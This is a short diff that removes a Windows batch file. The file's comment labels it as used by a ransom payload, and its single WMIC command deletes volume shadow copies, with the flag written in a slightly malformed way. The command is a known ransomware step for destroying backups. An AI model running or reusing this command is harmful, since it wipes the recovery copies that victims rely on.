@@ -1,3 +1,0 @@
-REM Used by Ransom Payload
-
-WMIC.exe shadowcopy delete / nointeractive
